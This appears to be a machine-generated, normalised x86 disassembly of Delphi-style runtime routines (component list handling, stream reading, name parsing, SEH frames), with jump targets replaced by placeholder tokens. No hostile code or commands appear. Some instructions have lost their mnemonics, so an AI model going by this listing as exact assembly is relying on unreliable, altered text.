mov eax [ ebp + 0x10 ]
mov [ esi + 0xc ] eax
lea eax [ esi + 0x10 ]
mov edx [ ebp + 0xc ]
call sub_40408c
lea eax [ esi + 0x14 ]
mov edx [ ebp + 0x8 ]
call sub_40408c
mov eax esi
test bl bl
je r-xdata
add esp 0xfffffff0
call sub_40360c
mov eax esi
pop esi
pop ebx
pop ebp
retn 0x10
call sub_403664
pop [ fs : 0x0 ]
add esp 0xc
sub_419ef0
push ebx
push esi
push edi
push ebp
mov edi eax
xor eax eax
mov esi [ edi + 0x14 ]
mov ebx esi
jmp r-xdata
mov dl [ ebx ]
test dl dl
je r-xdata
cmp [ ebx ] 0x0
je r-xdata
sub dl 0x2e
jne r-xdata
pop ebp
pop edi
pop esi
pop ebx
retn
mov ebp ebx
sub ebp esi
mov ecx ebp
lea eax [ edi + 0x10 ]
mov edx esi
call sub_404128
mov ecx ebp
inc ecx
lea eax [ edi + 0x14 ]
mov edx 0x1
call sub_404598
mov al 0x1
inc ebx
sub_419f48
push ebp
mov ebp esp
push 0x0
push ebx
push esi
mov esi edx
mov ebx eax
xor eax eax
push ebp
push sub_419fbf
push [ fs : eax ]
mov [ fs : eax ] esp
lea eax [ ebp - 0x4 ]
call sub_405928
test esi esi
je r-xdata
mov ecx [ ebp - 0x4 ]
mov edx [ ebx + 0xc ]
mov eax [ ebx + 0x4 ]
call sub_414504
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_419fc6
lea eax [ ebp - 0x4 ]
call sub_405928
retn
mov eax [ ebx + 0xc ]
mov eax [ eax ]
mov eax [ eax ]
call sub_413e14
add eax 0x5
push eax
lea eax [ ebp - 0x4 ]
call sub_405928
mov ecx eax
mov eax esi
pop edx
call sub_40d1c0
test al al
jne r-xdata
lea eax [ ebp - 0x4 ]
call sub_405928
sub_419fcc
push ebp
mov ebp esp
add esp 0xfffffff8
push ebx
push esi
push edi
xor ecx ecx
mov [ ebp - 0x8 ] ecx
mov ebx edx
mov esi eax
xor eax eax
push ebp
push sub_41a072
push [ fs : eax ]
mov [ fs : eax ] esp
xor eax eax
mov [ ebp - 0x4 ] eax
test ebx ebx
je r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_41a079
lea eax [ ebp - 0x8 ]
call sub_404038
retn
mov edi esi
jmp r-xdata
cmp [ ebx ] 0x0
jne r-xdata
mov eax ebx
jmp r-xdata
mov [ ebp - 0x4 ] edi
mov dl [ ebx ]
test dl dl
je r-xdata
mov ecx ebx
sub ecx eax
lea edx [ ebp - 0x8 ]
xchg edx eax
call sub_404128
mov edx [ ebp - 0x8 ]
mov eax edi
call sub_41d5a0
mov esi eax
test esi esi
jne r-xdata
add dl 0xd3
sub dl 0x2
jae r-xdata
test esi esi
je r-xdata
mov edx r-xdata
mov eax [ ebp - 0x8 ]
call sub_407fd4
test al al
je r-xdata
inc ebx
cmp [ ebx ] 0x2e
jne r-xdata
mov esi edi
cmp [ ebx ] 0x2d
jne r-xdata
inc ebx
cmp [ ebx ] 0x3e
jne r-xdata
inc ebx
mov edi esi
inc ebx
sub_41a094
push ebp
mov ebp esp
push ebx
mov ebx eax
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
mov edx ebx
call sub_4175cc
test eax eax
jge r-xdata
pop ebx
pop ebp
retn
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x8 ]
mov edx ebx
call sub_4175cc
test eax eax
jl r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
mov edx ebx
call sub_417414
sub_41a0cc
push ebp
mov ebp esp
push ebx
mov ebx eax
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
mov edx ebx
call sub_4175cc
cmp eax 0xffffffff
je r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x8 ]
mov edx ebx
call sub_4175cc
test eax eax
jge r-xdata
mov edx [ ebp + 0x8 ]
mov edx [ edx - 0x4 ]
xchg edx eax
call sub_417460
pop ebx
pop ebp
retn
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x8 ]
mov edx ebx
call sub_417414
sub_41a114
push ebp
mov ebp esp
add esp 0xfffffff4
push ebx
push esi
push edi
mov eax [ rw-data ]
mov edx [ eax ]
call [ edx + 0x14 ]
xor edx edx
push ebp
push sub_41a2ad
push [ fs : edx ]
mov [ fs : edx ] esp
mov eax [ rw-data ]
call sub_4178dc
mov edi eax
xor edx edx
push ebp
push sub_41a28e
push [ fs : edx ]
mov [ fs : edx ] esp
cmp [ edi + 0x8 ] 0x0
jle r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_41a295
mov eax [ rw-data ]
call sub_417940
retn
mov dl 0x1
mov eax [ r-xdata ]
call sub_4032b8
mov [ ebp - 0x4 ] eax
xor edx edx
push ebp
push sub_41a26f
push [ fs : edx ]
mov [ fs : edx ] esp
mov dl 0x1
mov eax [ r-xdata ]
call sub_4032b8
mov [ ebp - 0x8 ] eax
xor edx edx
push ebp
push sub_41a21d
push [ fs : edx ]
mov [ fs : edx ] esp
xor esi esi
jmp r-xdata
cmp esi [ edi + 0x8 ]
jl r-xdata
mov edx esi
mov eax edi
call sub_417570
mov ebx eax
mov eax [ ebx + 0x10 ]
call sub_4170bc
mov [ ebp - 0xc ] eax
cmp [ ebp - 0xc ] 0x0
jne r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_41a224
mov eax [ ebp - 0x8 ]
call sub_4032e8
retn
cmp [ ebp - 0xc ] 0x0
je r-xdata
mov edx [ ebx + 0xc ]
mov eax [ ebx + 0x4 ]
call sub_413f40
test eax eax
je r-xdata
push ebp
mov eax [ ebx + 0x4 ]
call sub_41a094
pop ecx
mov edx esi
mov eax edi
call sub_417460
mov eax ebx
call sub_4032e8
jmp r-xdata
mov edx [ ebx + 0x14 ]
mov eax [ ebp - 0xc ]
call sub_419fcc
mov edx eax
mov eax ebx
mov ecx [ eax ]
call [ ecx ]
push ebp
mov eax [ ebx + 0x4 ]
call sub_41a0cc
pop ecx
inc esi
sub_41a224
mov eax [ ebp - 0x4 ]
mov ebx [ eax + 0x8 ]
dec ebx
test ebx ebx
jl r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
mov eax [ ebp - 0x4 ]
call sub_4032e8
retn
inc ebx
xor esi esi
inc esi
dec ebx
jne r-xdata
and [ edi + 0x1c ] 0xff7f
mov edx esi
mov eax [ ebp - 0x4 ]
call sub_417570
mov edi eax
mov eax edi
mov edx [ r-xdata ]
call sub_403474
test al al
je r-xdata
sub_41a2bc
push ebp
mov ebp esp
add esp 0xfffffff8
push ebx
push esi
push edi
mov [ ebp - 0x8 ] edx
mov [ ebp - 0x4 ] eax
cmp [ rw-data ] 0x0
je r-xdata
pop edi
pop esi
pop ebx
pop ecx
pop ecx
pop ebp
retn
mov eax [ rw-data ]
call sub_4178dc
mov edi eax
xor eax eax
push ebp
push sub_41a357
push [ fs : eax ]
mov [ fs : eax ] esp
mov ebx [ edi + 0x8 ]
dec ebx
cmp ebx 0x0
jl r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
mov eax [ rw-data ]
call sub_417940
retn
mov edx ebx
mov eax edi
call sub_417570
mov esi eax
cmp [ ebp - 0x4 ] 0x0
je r-xdata
cmp [ ebp - 0x8 ] 0x0
je r-xdata
mov eax [ esi + 0x8 ]
cmp eax [ ebp - 0x4 ]
jne r-xdata
mov edx ebx
mov eax edi
call sub_417460
mov eax esi
call sub_4032e8
mov edx [ esi + 0x10 ]
mov eax [ ebp - 0x8 ]
call sub_407fd4
test al al
je r-xdata
dec ebx
cmp ebx 0xffffffff
jne r-xdata
sub_41a368
push ebp
mov ebp esp
push ecx
push ebx
push esi
push edi
mov [ ebp - 0x4 ] eax
cmp [ rw-data ] 0x0
je r-xdata
pop edi
pop esi
pop ebx
pop ecx
pop ebp
retn
mov eax [ rw-data ]
call sub_4178dc
mov edi eax
xor eax eax
push ebp
push sub_41a3df
push [ fs : eax ]
mov [ fs : eax ] esp
mov ebx [ edi + 0x8 ]
dec ebx
cmp ebx 0x0
jl r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
mov eax [ rw-data ]
call sub_417940
retn
mov edx ebx
mov eax edi
call sub_417570
mov esi eax
mov eax [ esi + 0x4 ]
cmp eax [ ebp - 0x4 ]
jne r-xdata
dec ebx
cmp ebx 0xffffffff
jne r-xdata
mov edx ebx
mov eax edi
call sub_417460
mov eax esi
call sub_4032e8
sub_41a410
push ebx
add esp 0xfffffff8
mov ebx eax
mov [ esp ] ebx
mov [ esp + 0x4 ] 0xb
push esp
push 0x0
mov ecx [ rw-data ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_40b8d0
call sub_403a74
pop ecx
pop edx
pop ebx
retn
sub_41a454
push ebx
push esi
push edi
call sub_403674
mov ebx edx
mov esi eax
mov edx [ esi + 0x10 ]
sub edx [ esi + 0x14 ]
mov eax [ esi + 0x4 ]
mov cx 0x1
mov edi [ eax ]
call [ edi + 0x14 ]
mov edx ebx
and dl 0xfc
mov eax esi
call sub_419d94
test bl bl
jle r-xdata
pop edi
pop esi
pop ebx
retn
mov eax esi
call sub_40365c
sub_41a490
push ebx
push esi
mov ebx edx
mov esi eax
mov eax esi
call sub_41c368
cmp bl al
je r-xdata
pop esi
pop ebx
retn
dec [ esi + 0x10 ]
mov eax esi
call sub_41c478
call sub_41a404
sub_41a4b4
push ebp
mov ebp esp
push ebx
push esi
mov esi edx
mov ebx eax
mov edx [ ebx + 0x70 ]
mov eax esi
call sub_407fd4
test al al
je r-xdata
pop esi
pop ebx
pop ebp
retn 0x10
cmp [ ebp + 0x12 ] 0x0
je r-xdata
mov edx ebx
mov eax [ ebp + 0x14 ]
call [ ebp + 0x10 ]
lea eax [ ebx + 0x70 ]
call sub_404038
sub_41a4e8
push ebp
mov ebp esp
add esp 0xfffffff4
push ebx
mov ebx edx
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
mov edx [ eax + 0x70 ]
mov eax ebx
call sub_407fd4
test al al
je r-xdata
pop ebx
mov esp ebp
pop ebp
retn 0x10
cmp [ ebp + 0x12 ] 0x0
je r-xdata
mov eax [ ebp - 0x4 ]
call sub_41c368
cmp al 0xa
je r-xdata
mov dl 0x1
mov eax [ r-xdata ]
call sub_4032b8
mov [ ebp - 0x8 ] eax
xor eax eax
push ebp
push sub_41a5a9
push [ fs : eax ]
mov [ fs : eax ] esp
lea edx [ ebp - 0xc ]
mov ecx 0x4
mov eax [ ebp - 0x4 ]
call sub_41a92c
mov edx [ ebp - 0xc ]
mov eax [ ebp - 0x8 ]
mov ecx [ eax ]
call [ ecx + 0x4 ]
mov eax [ ebp - 0x8 ]
mov edx [ eax + 0x4 ]
mov ecx [ ebp - 0xc ]
mov eax [ ebp - 0x4 ]
call sub_41a92c
mov eax [ ebp - 0x4 ]
mov [ eax + 0x78 ] 0x1
mov edx [ ebp - 0x8 ]
mov eax [ ebp + 0x14 ]
call [ ebp + 0x10 ]
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_41a5b0
mov eax [ ebp - 0x8 ]
call sub_4032e8
retn
mov eax [ ebp - 0x4 ]
dec [ eax + 0x10 ]
mov eax [ ebp - 0x4 ]
call sub_41c478
mov eax [ ebp - 0x4 ]
mov [ eax + 0x78 ] 0x1
call sub_41a404
sub_41a5d8
push ebx
push ecx
mov [ esp ] 0x0
cmp [ eax + 0x5a ] 0x0
je r-xdata
mov al [ esp ]
pop edx
pop ebx
retn
push esp
mov ebx eax
mov ecx edx
mov edx eax
mov eax [ ebx + 0x5c ]
call [ ebx + 0x58 ]
sub_41a5f8
push ebx
push esi
push edi
add esp 0xfffffef8
mov esi ecx
mov edi edx
mov ebx eax
lea eax [ esp + 0x8 ]
mov edx esi
mov ecx 0xff
call sub_4042d4
lea edx [ esp + 0x8 ]
mov eax [ edi ]
call sub_40356c
mov [ esp ] eax
cmp [ esp ] 0x0
sete [ esp + 0x4 ]
cmp [ ebx + 0x3a ] 0x0
je r-xdata
cmp [ esp + 0x4 ] 0x0
je r-xdata
push esp
lea eax [ esp + 0x8 ]
push eax
mov ecx esi
mov edx ebx
mov eax [ ebx + 0x3c ]
call [ ebx + 0x38 ]
mov eax [ esp ]
add esp 0x108
pop edi
pop esi
pop ebx
retn
call sub_41a404
sub_41a660
push ebp
mov ebp esp
push ebx
push esi
push edi
mov edi eax
mov eax [ rw-data ]
call sub_4178dc
mov esi eax
xor edx edx
push ebp
push sub_41a6d0
push [ fs : edx ]
mov [ fs : edx ] esp
mov ebx [ esi + 0x8 ]
dec ebx
cmp ebx 0x0
jl r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_41a6d7
mov eax [ rw-data ]
call sub_417940
retn
mov edx ebx
mov eax esi
call sub_417570
mov edx [ eax + 0x4 ]
cmp edx [ edi + 0x4 ]
jne r-xdata
dec ebx
cmp ebx 0xffffffff
jne r-xdata
mov edx [ eax + 0xc ]
cmp edx [ edi + 0xc ]
jne r-xdata
call sub_4032e8
mov edx ebx
mov eax esi
call sub_417460
sub_41a6dc
push ebp
mov ebp esp
add esp 0xfffffff4
push ebx
push esi
push edi
xor edx edx
mov [ ebp - 0x8 ] edx
mov [ ebp - 0x4 ] eax
xor eax eax
push ebp
push sub_41a7eb
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x30 ]
test eax eax
je r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_41a7f2
lea eax [ ebp - 0x8 ]
call sub_404038
retn
xor edx edx
push ebp
push sub_41a7ce
push [ fs : edx ]
mov [ fs : edx ] esp
mov eax [ eax + 0x8 ]
dec eax
test eax eax
jl r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
mov eax [ ebp - 0x4 ]
call sub_41a820
retn
inc eax
mov [ ebp - 0xc ] eax
xor esi esi
mov edx edi
mov eax ebx
mov ecx [ eax ]
call [ ecx ]
mov eax ebx
call sub_419ef0
test al al
je r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x30 ]
mov edx esi
call sub_417570
mov ebx eax
lea eax [ ebp - 0x8 ]
mov edx [ ebx + 0x14 ]
call sub_4040d0
lea edx [ ebp - 0x8 ]
mov eax [ ebp - 0x4 ]
mov ecx [ eax ]
call [ ecx + 0x20 ]
mov eax [ ebx + 0x8 ]
mov edx [ ebp - 0x8 ]
call sub_419fcc
mov edi eax
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x30 ]
mov edx esi
call sub_417570
call sub_41a660
test edi edi
jne r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x30 ]
mov edx esi
call sub_417570
mov edx eax
mov eax [ rw-data ]
call sub_417854
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x30 ]
xor ecx ecx
mov edx esi
call sub_417664
jmp r-xdata
inc esi
dec [ ebp - 0xc ]
jne r-xdata
sub_41a7fc
push ebx
mov ebx eax
mov eax ebx
call sub_41a8f0
cdq
push edx
push eax
mov eax [ ebx + 0x4 ]
call sub_419308
xor eax eax
mov [ ebx + 0x10 ] eax
xor eax eax
mov [ ebx + 0x14 ] eax
pop ebx
retn
sub_41a820
push ebx
push esi
push edi
mov ebx eax
mov eax [ ebx + 0x30 ]
test eax eax
je r-xdata
pop edi
pop esi
pop ebx
retn
mov esi [ eax + 0x8 ]
dec esi
test esi esi
jl r-xdata
mov eax [ ebx + 0x30 ]
call sub_4032e8
xor eax eax
mov [ ebx + 0x30 ] eax
inc esi
xor edi edi
mov edx edi
mov eax [ ebx + 0x30 ]
call sub_417570
call sub_4032e8
inc edi
dec esi
jne r-xdata
sub_41a85c
push ebx
push esi
push edi
push ebp
add esp 0xfffffff4
mov [ esp + 0x4 ] ecx
mov [ esp ] eax
mov eax edx
call sub_403230
mov ebp eax
jmp r-xdata
cmp ebp [ r-xdata ]
jne r-xdata
mov eax ebp
call sub_416c04
mov esi eax
test esi esi
je r-xdata
mov eax [ esp ]
mov eax [ eax + 0x74 ]
test eax eax
je r-xdata
mov eax ebp
call sub_403274
mov ebp eax
movsx ebx [ esi ]
dec ebx
test ebx ebx
jl r-xdata
mov eax [ esp + 0x4 ]
call sub_416c7c
mov edi eax
mov edx [ esp + 0x4 ]
call sub_416b7c
mov edi eax
jmp r-xdata
inc ebx
mov [ esp + 0x8 ] 0x0
mov eax edi
add esp 0xc
pop ebp
pop edi
pop esi
pop ebx
retn
inc [ esp + 0x8 ]
dec ebx
jne r-xdata
mov eax [ esp + 0x8 ]
mov eax [ esi + eax * 4 + 0x2 ]
mov edi [ eax ]
mov edx [ esp + 0x4 ]
mov eax edi
call sub_40324c
test al al
jne r-xdata
sub_41a92c
push esi
push edi
push ebx
mov edi edx
mov ebx ecx
mov esi eax
jmp r-xdata
or ebx ebx
jne r-xdata
mov ecx [ esi + 0x14 ]
sub ecx [ esi + 0x10 ]
ja r-xdata
pop ebx
pop edi
pop esi
retn
cmp ecx ebx
jb r-xdata
mov eax esi
call sub_41a978
mov ecx [ esi + 0x14 ]
push esi
sub ebx ecx
mov eax [ esi + 0x8 ]
add eax [ esi + 0x10 ]
add [ esi + 0x10 ] ecx
mov esi eax
mov edx ecx
shr ecx 0x2
cld
[ edi ] [ esi ]
mov ecx edx
and ecx 0x3
[ edi ] [ esi ]
pop esi
mov ecx ebx
sub_41a978
push ebx
push esi
mov ebx eax
mov edx [ ebx + 0x8 ]
mov ecx [ ebx + 0xc ]
mov eax [ ebx + 0x4 ]
mov esi [ eax ]
call [ esi + 0xc ]
mov esi eax
mov [ ebx + 0x14 ] esi
test esi esi
jne r-xdata
xor eax eax
mov [ ebx + 0x10 ] eax
pop esi
pop ebx
retn
mov ecx [ rw-data ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_40b894
call sub_403a74
sub_41a9c8
push ebp
mov ebp esp
push 0x0
push ebx
mov ebx eax
xor eax eax
push ebp
push sub_41aa13
push [ fs : eax ]
mov [ fs : eax ] esp
lea edx [ ebp - 0x4 ]
mov eax ebx
call sub_41c1c8
mov eax [ ebp - 0x4 ]
call sub_4042f8
dec eax
jle r-xdata
mov eax [ ebp - 0x4 ]
mov bl [ eax ]
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_41aa1a
lea eax [ ebp - 0x4 ]
call sub_404038
retn
call sub_41a404
sub_41aa20
push ebp
mov ebp esp
push ecx
push ebx
push esi
mov [ ebp - 0x4 ] edx
mov ebx eax
mov eax [ ebp - 0x4 ]
mov edx [ eax ]
call [ edx + 0x20 ]
xor eax eax
push ebp
push sub_41aac0
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax ebx
call sub_41a5c4
test al al
jne r-xdata
mov eax ebx
call sub_41a5c4
test al al
je r-xdata
mov eax [ ebp - 0x4 ]
call sub_417d90
jmp r-xdata
mov eax ebx
call sub_41a908
add al 0xfe
sub al 0x3
jae r-xdata
mov eax ebx
call sub_41b530
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_41aac7
mov eax [ ebp - 0x4 ]
mov edx [ eax ]
call [ edx + 0x24 ]
retn
mov eax [ ebp - 0x4 ]
call sub_417d70
mov esi eax
mov eax ebx
call sub_41b528
jmp r-xdata
mov eax ebx
call sub_41b478
mov eax ebx
call sub_41a5c4
test al al
je r-xdata
mov edx esi
mov eax ebx
call sub_41b694
mov eax ebx
call sub_41b530
sub_41aaf0
push ebp
mov ebp esp
push ebx
push esi
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
call sub_4050b4
mov ebx eax
dec ebx
test ebx ebx
jl r-xdata
pop esi
pop ebx
pop ebp
retn
inc ebx
xor esi esi
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
mov edx [ eax + esi * 4 ]
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x8 ]
mov eax [ eax + 0x34 ]
call sub_417414
inc esi
dec ebx
jne r-xdata
sub_41ab2c
push ebp
mov ebp esp
push ebx
push esi
push edi
mov edi eax
mov eax edi
call sub_41d6bc
mov esi eax
dec esi
test esi esi
jl r-xdata
pop edi
pop esi
pop ebx
pop ebp
retn
inc esi
xor ebx ebx
inc ebx
dec esi
jne r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
call sub_4050b4
inc eax
push eax
mov eax [ ebp + 0x8 ]
add eax 0xfffffffc
mov ecx 0x1
mov edx [ r-xdata ]
call sub_405270
add esp 0x4
mov edx ebx
mov eax edi
call sub_41d690
push eax
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
call sub_4050b4
mov edx [ ebp + 0x8 ]
mov edx [ edx - 0x4 ]
pop ecx
mov [ edx + eax * 4 - 0x4 ] ecx
mov edx ebx
mov eax edi
call sub_41d690
test [ eax + 0x24 ] 0x4
je r-xdata
sub_41aba4
push ebp
mov ebp esp
push ecx
push ebx
push esi
push edi
mov [ ebp - 0x3 ] dl
mov [ ebp - 0x2 ] ax
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
call sub_4050b4
mov esi eax
dec esi
test esi esi
jl r-xdata
pop edi
pop esi
pop ebx
pop ecx
pop ebp
retn
inc esi
xor ebx ebx
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
mov edi [ eax + ebx * 4 ]
mov ax [ ebp - 0x2 ]
not eax
and ax [ edi + 0x1c ]
mov edx [ ebp + 0x8 ]
mov [ edi + 0x1c ] ax
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
mov edi [ eax + ebx * 4 ]
mov ax [ edi + 0x1c ]
or ax [ ebp - 0x2 ]
mov edx [ ebp + 0x8 ]
mov [ edi + 0x1c ] ax
jmp r-xdata
cmp [ ebp - 0x3 ] 0x0
je r-xdata
inc ebx
dec esi
jne r-xdata
sub_41ac0c
push ebp
mov ebp esp
mov eax [ ebp + 0x8 ]
test [ eax - 0x9 ] 0x1
jne r-xdata
xor eax eax
pop ebp
retn
mov eax [ ebp + 0x8 ]
cmp [ eax - 0x10 ] 0x0
je r-xdata
mov al 0x1
pop ebp
retn
sub_41ac2c
push ebp
mov ebp esp
push ebx
push esi
mov esi eax
xor ebx ebx
call sub_4027fc
mov edx [ r-xdata ]
call sub_403474
test al al
je r-xdata
mov eax ebx
pop esi
pop ebx
pop ebp
retn
mov eax [ ebp + 0x8 ]
push eax
call sub_41ac0c
pop ecx
test al al
je r-xdata
xor eax eax
mov [ esi ] eax
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x8 ]
xor edx edx
call sub_41c65c
call sub_4027fc
mov edx [ eax + 0x4 ]
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x8 ]
mov ecx [ eax ]
call [ ecx + 0x10 ]
mov ebx eax
mov eax [ esi ]
call sub_4032e8
sub_41ac8c
push ebp
mov ebp esp
push ebx
push esi
push edi
xor eax eax
push ebp
push sub_41ad72
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp + 0x8 ]
mov edx [ eax - 0x18 ]
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x8 ]
call sub_41c7fc
mov ebx eax
mov eax [ ebp + 0x8 ]
xor edx edx
mov [ eax - 0x14 ] edx
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x8 ]
cmp [ eax + 0x6a ] 0x0
je r-xdata
mov eax [ ebp + 0x8 ]
cmp [ eax - 0x14 ] 0x0
jne r-xdata
mov eax [ ebp + 0x8 ]
add eax 0xffffffec
push eax
mov eax [ ebp + 0x8 ]
mov esi [ eax - 0x8 ]
mov eax [ ebp + 0x8 ]
mov edx [ eax - 0x8 ]
mov ecx ebx
mov eax [ esi + 0x6c ]
call [ esi + 0x68 ]
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x14 ]
or [ eax + 0x1c ] 0x1
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
jmp r-xdata
mov eax ebx
call [ eax - 0xc ]
mov edx [ ebp + 0x8 ]
mov [ edx - 0x14 ] eax
mov eax [ ebp + 0x8 ]
test [ eax - 0x9 ] 0x4
je r-xdata
pop edi
pop esi
pop ebx
pop ebp
retn
xor eax eax
push ebp
push sub_41ad46
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x8 ]
mov ecx [ eax + 0x28 ]
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x14 ]
or edx 0xffffffff
mov ebx [ eax ]
call [ ebx + 0x2c ]
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
jmp r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x14 ]
or [ eax + 0x1c ] 0x1
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x14 ]
or [ eax + 0x1c ] 0x200
sub_41ad77
mov eax [ ebp + 0x8 ]
push eax
mov eax [ ebp + 0x8 ]
add eax 0xffffffec
call sub_41ac2c
pop ecx
test al al
jne r-xdata
call sub_403af0
pop edi
pop esi
pop ebx
pop ebp
retn
call sub_403a9c
sub_41ad9c
push ebp
mov ebp esp
push ebx
push esi
push edi
xor eax eax
push ebp
push sub_41ae14
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x8 ]
mov edx [ eax + 0x2c ]
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x14 ]
mov si 0xfff8
call sub_4034e4
mov eax [ ebp + 0x8 ]
lea ecx [ eax - 0x1c ]
mov eax [ ebp + 0x8 ]
mov edx [ eax - 0x14 ]
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x8 ]
mov ebx [ eax ]
call [ ebx + 0x1c ]
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x14 ]
test [ eax + 0x1c ] 0x10
je r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
jmp r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x1c ]
call sub_4170bc
mov edx [ ebp + 0x8 ]
cmp eax [ edx - 0x14 ]
jne r-xdata
pop edi
pop esi
pop ebx
pop ebp
retn
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x14 ]
or [ eax + 0x1c ] 0x200
sub_41ae19
mov eax [ ebp + 0x8 ]
push eax
mov eax [ ebp + 0x8 ]
add eax 0xffffffec
call sub_41ac2c
pop ecx
test al al
jne r-xdata
call sub_403af0
pop edi
pop esi
pop ebx
pop ebp
retn
call sub_403a9c
sub_41ae3c
push ebp
mov ebp esp
push ebx
push esi
push edi
xor eax eax
push ebp
push sub_41aeb7
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp + 0x8 ]
mov edx [ eax - 0x18 ]
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x8 ]
call sub_41c7fc
mov ecx eax
mov eax [ ebp + 0x8 ]
mov edx [ eax - 0x1c ]
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x8 ]
mov ebx [ eax ]
call [ ebx + 0x14 ]
mov edx [ ebp + 0x8 ]
mov [ edx - 0x14 ] eax
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x14 ]
mov si 0xfff2
call sub_4034e4
mov ebx eax
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x8 ]
mov [ eax + 0x2c ] ebx
mov eax [ ebp + 0x8 ]
test ebx ebx
jne r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
jmp r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x8 ]
mov eax [ eax + 0x18 ]
mov edx [ ebp + 0x8 ]
mov edx [ edx - 0x8 ]
mov [ edx + 0x2c ] eax
pop edi
pop esi
pop ebx
pop ebp
retn
sub_41aebc
mov eax [ ebp + 0x8 ]
push eax
mov eax [ ebp + 0x8 ]
add eax 0xffffffec
call sub_41ac2c
pop ecx
test al al
jne r-xdata
call sub_403af0
pop edi
pop esi
pop ebx
pop ebp
retn
call sub_403a9c
sub_41aee0
push ebp
mov ebp esp
add esp 0xffffffd8
push ebx
push esi
push edi
xor ecx ecx
mov [ ebp - 0x18 ] ecx
mov [ ebp - 0x1c ] ecx
mov [ ebp - 0x4 ] ecx
mov [ ebp - 0x10 ] edx
mov [ ebp - 0x8 ] eax
xor eax eax
push ebp
push sub_41b101
push [ fs : eax ]
mov [ fs : eax ] esp
lea ecx [ ebp - 0x20 ]
lea edx [ ebp - 0x9 ]
mov eax [ ebp - 0x8 ]
mov ebx [ eax ]
call [ ebx + 0x24 ]
lea edx [ ebp - 0x18 ]
mov eax [ ebp - 0x8 ]
call sub_41c18c
lea edx [ ebp - 0x1c ]
mov eax [ ebp - 0x8 ]
call sub_41c18c
mov eax [ ebp - 0x8 ]
mov eax [ eax + 0x2c ]
mov [ ebp - 0x24 ] eax
mov eax [ ebp - 0x8 ]
mov eax [ eax + 0x1c ]
mov [ ebp - 0x28 ] eax
xor eax eax
push ebp
push sub_41b0d1
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x10 ]
mov [ ebp - 0x14 ] eax
cmp [ ebp - 0x14 ] 0x0
jne r-xdata
cmp [ ebp - 0x14 ] 0x0
je r-xdata
test [ ebp - 0x9 ] 0x1
je r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
mov eax [ ebp - 0x8 ]
